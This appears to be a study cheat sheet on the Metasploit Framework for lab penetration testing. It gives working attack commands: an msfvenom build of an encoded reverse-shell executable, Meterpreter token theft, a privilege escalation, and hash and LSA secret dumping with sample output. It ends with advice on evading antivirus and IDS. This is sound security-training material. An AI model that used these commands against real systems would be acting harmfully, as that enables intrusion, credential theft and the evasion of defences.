### Introduction
The `Metasploit Project` is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute the exploit code.
```bash
msfconsole
```
## MSF Components
### Modules
```bash
# 794   exploit/windows/ftp/scriptftp_list

<No.> <type>/<os>/<service>/<name> # Syntax
#  Index No.: displayed to select the exploit we want afterward during our searches

# Type : 
# Auxiliary   Scanning, fuzzing, sniffing, admin tasks; provide extra functions
# Encoders    Help payloads arrive intact at target
# Exploits    Use vulns to deliver payloads
# NOPs        Maintain consistent payload sizes
# Payloads    Remote code that connects back to attacker
# Plugins     Extra scripts for msfconsole usage
# Post        Info gathering, pivoting, and post-exploit actions

# OS: Operation System
# Service: vulnerable service
# Name : actual action that can be performed using this module
---------------------------------------------------------------------

search type:exploit platform:windows cve:2021 rank:excellent microsoft # Specific Search
setg LHOSTS 10.10.10.40 # set globale value 
set VHOST <vhost.domain> #=> HTTP server virtual host (importe to look on it)
```

### Targets
`Targets` are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system.
```bash
show targets
# 1   IE 7 on Windows XP SP3  ,  2   IE 8 on Windows XP SP3
set target 1 # select a target 1 win xp
```
**Target Types**
There is a large variety of target types. Every target can vary from another by service pack, OS version, and even language version. It all depends on the return address and other parameters in the target or within the exploit module.
The return address `jmp esp` can vary because a particular language pack changes addresses, a different software version is available,

To identify a target correctly, we will need to:

- Obtain a copy of the target binaries
- Use msfpescan to locate a suitable return address

###  Payloads
A `Payload` in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker
There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages:

 *Singles:* A `Single` payload contains the exploit and the entire shellcode for the selected task.
*Stagers:* are typically used to set up a `network connection` between the attacker and victim and are designed to be small and reliable
*Stages* are` payload components` that are downloaded by stager's modules.

```bash
msf6 > show payloads
grep meterpreter grep reverse_tcp show payloads # filtring the payloads
set payload <no.> # select a payload

# generic payloads
# multi-use listener
generic/custom
# bind shell, TCP
generic/shell_bind_tcp
# reverse shell, TCP
generic/shell_reverse_tcp

# windows x64 payloads
# run any cmd
windows/x64/exec
# load DLL path
windows/x64/loadlibrary
# show msgbox
windows/x64/messagebox
# reverse shell, single
windows/x64/shell_reverse_tcp
# reverse shell, staged
windows/x64/shell/reverse_tcp
# bind shell over IPv6
windows/x64/shell/bind_ipv6_tcp

# advanced payloads
# meterpreter + variants
windows/x64/meterpreter/$
# powershell sessions + variants
windows/x64/powershell/$
# VNC access via injection
windows/x64/vncinject/$
```
### Encoders
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o shell.exe

msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders # for the exploit
```
###  Databases
```bash
# setup db
sudo service postgresql start
sudo msfdb init    
sudo msfdb status # check the db status
sudo msfdb run 

# have problem in msfdb init ? , port 5432 failed: Connection refused 
sudo msfdb reinit
sudo nano /etc/postgresql/17/main/postgresql.conf  # check the port to 5432
sudo msfdb run
msf6 > connect 127.0.0.1 5432

# if we alredy setup the db
sudo msfdb reinit
sudo cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
sudo msfdb run

msf6 > db_status   # connected 
msf6 > help database


workspace -h
workspace -a Target_1 # add new workspace
workspace Target_1 
workspace             # * Target_1


hosts # host addresses, hostnames, and other information(Nessus, NexPose, or Nmap)
services  # information on services discovered during scans or interactions.
creds  # credentials gathered during your interactions
loot # works in conjunction with the command above to offer you an at-a-glance list of owned services and users

db_nmap -sV -sS 10.10.10.8 # nmap scan inside msfconsole
b_import nmap_scan.xml # import nmap scan
db_export -f xml backup.xml # export db
```

### Plugins
```bash
# /usr/share/metasploit-framework/plugins
load nessus
nessus_help

# install and add new plugin
git clone https://github.com/darkoperator/Metasploit-Plugins
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
msfconsole -q
load pentest
```

### Sessions
```bash
meterpreter > background or [CTRL] + [Z] 
sessions # view sessions
sessions -i 1
```
### Jobs
```bash
exploit -j # run exploit as backgroud job
jobs -l # list all running jobs
jobs -k <id>
```

### Meterpreter
```bash
meterpreter > getuid #  [-] 1055: Operation failed: Access is denied.
meterpreter > ps 
#  1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
meterpreter > steal_token 1836 # Stolen token with username: NT AUTHORITY\NETWORK SERVICE
meterpreter > getuid # NT AUTHORITY\NETWORK SERVICE
background

# priv esc 
use multi/recon/local_exploit_suggester
set SESSION 1 
run # [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
use exploit/windows/local/ms15_051_client_copy_images
set session 1
set LHOST tun0
run
getuid # NT AUTHORITY\SYSTEM

hashdump # Dumping Hashes
#Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
lsa_dump_sam 
# User : Administrator
#  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
#  Hash NTLM: d6908f022af0373e9e21b8a241c86dca
lsa_dump_secrets
# Secret  : aspnet_WP_PASSWORD
# cur/text: Q5C'181g16D'=F
```

### Writing and Importing Modules
```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
msf6> loadpath /usr/share/metasploit-framework/modules/
msf6 > reload_all # alternative to load  modules
```
If you would like to learn more about porting scripts into the Metasploit Framework, check out the [Metasploit: A Penetration Tester's Guide book from No Starch Press](https://nostarch.com/metasploit). Rapid7 has also created blog posts on this topic, which can be found [here](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/).
### Introduction to MSFVenom
check here => [[msfvenom]]


### Firewall and IDS/IPS Evasion Techniques

Firewalls and IDS/IPS are designed to detect or block *malicious traffic*, payloads, and known patterns like *NOP sleds* or *common shellcode*. If your exploit gets detected, you might lose your only chance to succeed during an engagement. Always *test in a sandbox* before using the payload on a live target.

Endpoint vs. Perimeter Protection:
*Endpoint protection* is security software on individual machines like PCs or servers. It usually includes antivirus, antimalware, local firewalls, and anti-DDoS features. Examples: Avast, BitDefender, Malwarebytes.

*Perimeter protection* exists at the network’s edge, managing traffic between the internal and external network (internet). Firewalls and IDS/IPS operate here. Public-facing services are usually placed in a *DMZ (De-Militarized Zone)* — an intermediate layer between the internet and internal network.

Packers:
*Packers* are used to compress and obfuscate payloads. They bundle your backdoor + decompression stub into a single executable. When run, it decompresses itself and executes the payload. This helps to *evade antivirus detection* by modifying the file structure and behavior. Tools like *msfvenom* allow you to pack and encode payloads.

BoF and NOP Sleds:
A *Buffer Overflow (BoF)* occurs when input overflows memory space and hijacks program execution. Shellcode is injected to get control. A *NOP sled* (sequence of \x90 instructions) is often used to guide execution into the shellcode safely.

However, large NOP sleds are *easily detected* by IDS/IPS. Instead, consider using *custom encoders*, *polymorphic shellcode*, or *NOP-less techniques*.

Best Practices:
- Avoid default shellcode or common exploit patterns.
- Use encoding/packing techniques to obfuscate the payload.
- Always test your payload in a *safe environment (sandbox)*.
- Write *custom shellcode* or modify existing ones to bypass signature-based detection.